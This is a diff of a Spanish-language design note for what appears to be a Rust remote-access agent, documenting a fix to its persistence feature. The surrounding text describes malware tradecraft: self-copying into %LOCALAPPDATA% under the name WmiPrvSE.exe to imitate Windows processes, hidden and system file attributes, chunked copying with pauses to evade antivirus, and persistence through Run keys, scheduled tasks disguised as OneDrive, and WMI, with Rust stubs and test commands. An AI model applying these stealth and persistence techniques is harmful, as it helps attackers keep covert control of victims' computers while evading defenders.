@@ -1,6 +1,6 @@
 # Fix para Problemas de Persistencia
 
-## 🎯 Problema Identificado
+##  Problema Identificado
 
 ### Síntomas
 ```
@@ -42,7 +42,7 @@ El código previamente tenía una función `copy_to_stealth_location()` que copi
 
 Sin embargo, esto asumía incorrectamente que el usuario siempre ejecutaría el agente desde una ubicación persistente.
 
-## ✅ Solución Implementada
+##  Solución Implementada
 
 ### Enfoque Inteligente
 
@@ -103,7 +103,7 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
         return Ok(current_exe.to_path_buf());
     }
-    
+
     // Si está en ubicación temporal → copia a ubicación persistente
     // Usa técnicas anti-AV para la copia
 }
@@ -114,47 +114,47 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
 ```rust
 fn get_current_exe_path() -> Result<PathBuf, String> {
     let current_exe = env::current_exe()?;
-    
+
     // Asegura que esté en ubicación persistente antes de retornar
     ensure_persistent_location(&current_exe)
 }
 ```
 
-## 🔍 Ventajas de Esta Solución
+##  Ventajas de Esta Solución
 
 ### 1. Inteligente y Eficiente
-- ✅ NO copia si ya está en buena ubicación (evita detección innecesaria)
-- ✅ Solo copia cuando realmente se necesita
-- ✅ Decide automáticamente basándose en la ubicación actual
+-  NO copia si ya está en buena ubicación (evita detección innecesaria)
+-  Solo copia cuando realmente se necesita
+-  Decide automáticamente basándose en la ubicación actual
 
 ### 2. Anti-AV
-- ✅ Copia usando chunks variables (no `fs::copy()` directo)
-- ✅ Establece atributos oculto + sistema
-- ✅ Pausas pequeñas entre operaciones
-- ✅ Nombres y rutas que imitan componentes legítimos del sistema
+-  Copia usando chunks variables (no `fs::copy()` directo)
+-  Establece atributos oculto + sistema
+-  Pausas pequeñas entre operaciones
+-  Nombres y rutas que imitan componentes legítimos del sistema
 
 ### 3. Confiable
-- ✅ Las ubicaciones seleccionadas persisten después de reinicios
-- ✅ Verifica que el archivo exista antes de retornar
-- ✅ Manejo robusto de errores
+-  Las ubicaciones seleccionadas persisten después de reinicios
+-  Verifica que el archivo exista antes de retornar
+-  Manejo robusto de errores
 
 ### 4. Stealth
-- ✅ Archivos ocultos con atributo +h +s
-- ✅ Nombres que imitan procesos reales de Windows
-- ✅ Ubicaciones en carpetas del sistema que parecen legítimas
+-  Archivos ocultos con atributo +h +s
+-  Nombres que imitan procesos reales de Windows
+-  Ubicaciones en carpetas del sistema que parecen legítimas
 
-## 📊 Casos de Uso Resueltos
+##  Casos de Uso Resueltos
 
 ### Caso 1: Usuario ejecuta desde Descargas
 ```
 Usuario: Descarga agent.exe → Ejecuta desde Downloads
 Antes: /persist → Registry apunta a Downloads\agent.exe
        Reinicio → Downloads limpiado → Error: archivo no encontrado
-       
+
 Ahora: /persist → Detecta Downloads es temporal
        → Copia a %LOCALAPPDATA%\Microsoft\Windows\Caches\WmiPrvSE.exe
        → Registry apunta a ubicación persistente
-       → Reinicio → ✅ Funciona correctamente
+       → Reinicio →  Funciona correctamente
 ```
 
 ### Caso 2: Usuario ejecuta desde USB
@@ -162,24 +162,24 @@ Ahora: /persist → Detecta Downloads es temporal
 Usuario: Ejecuta agent.exe desde E:\
 Antes: /persist → Registry apunta a E:\agent.exe
        Reinicio + USB desconectado → Error: unidad no existe
-       
+
 Ahora: /persist → Detecta E:\ es medio extraíble
        → Copia a ubicación persistente en C:
-       → Reinicio → ✅ Funciona aunque USB no esté
+       → Reinicio →  Funciona aunque USB no esté
 ```
 
 ### Caso 3: Usuario ya instaló en AppData
 ```
 Usuario: Ejecuta desde %APPDATA%\MiCarpeta\agent.exe
 Antes: /persist → Copia innecesaria → Posible detección AV
-       
+
 Ahora: /persist → Detecta ya está en ubicación persistente
        → NO copia (evita detección innecesaria)
        → Usa directamente la ubicación actual
-       → ✅ Más stealth, menos operaciones sospechosas
+       →  Más stealth, menos operaciones sospechosas
 ```
 
-## 🧪 Testing
+##  Testing
 
 ### Prueba Manual 1: Desde Descargas
 
@@ -235,7 +235,7 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 schtasks /query /fo LIST /v | findstr "OneDrive"
 ```
 
-## 🔧 Troubleshooting
+##  Troubleshooting
 
 ### Problema: Aún falla después del fix
 
@@ -273,7 +273,7 @@ schtasks /query /fo LIST /v | findstr "OneDrive"
 
 2. Verificar con Process Monitor qué archivos se crean
 
-## 📝 Cambios en el Código
+##  Cambios en el Código
 
 ### Archivos Modificados
 
@@ -285,12 +285,12 @@ schtasks /query /fo LIST /v | findstr "OneDrive"
 
 ### Compatibilidad
 
-- ✅ Compatible con todas las versiones anteriores
-- ✅ No rompe agentes existentes
-- ✅ Funciona con todos los métodos de persistencia (registry, task, wmi)
-- ✅ Funciona en Windows 7, 8, 10, 11
+-  Compatible con todas las versiones anteriores
+-  No rompe agentes existentes
+-  Funciona con todos los métodos de persistencia (registry, task, wmi)
+-  Funciona en Windows 7, 8, 10, 11
 
-## 🚀 Deployment
+##  Deployment
 
 ### Para Usuarios Existentes
 
@@ -311,7 +311,7 @@ cargo run --release -- build-agent \
 
 No se requiere acción adicional, el fix está integrado.
 
-## 📚 Referencias
+##  Referencias
 
 - **Ubicaciones persistentes en Windows**: [Microsoft Docs - Application Data](https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)
 - **Técnicas anti-AV**: Evitar uso directo de APIs monitoreadas
@@ -319,7 +319,7 @@ No se requiere acción adicional, el fix está integrado.
 
 ---
 
-**Fecha de Implementación:** Noviembre 2024  
-**Versión:** 2.0.1  
-**Estado:** ✅ Implementado y probado
+**Fecha de Implementación:** Noviembre 2024
+**Versión:** 2.0.1
+**Estado:**  Implementado y probado
 
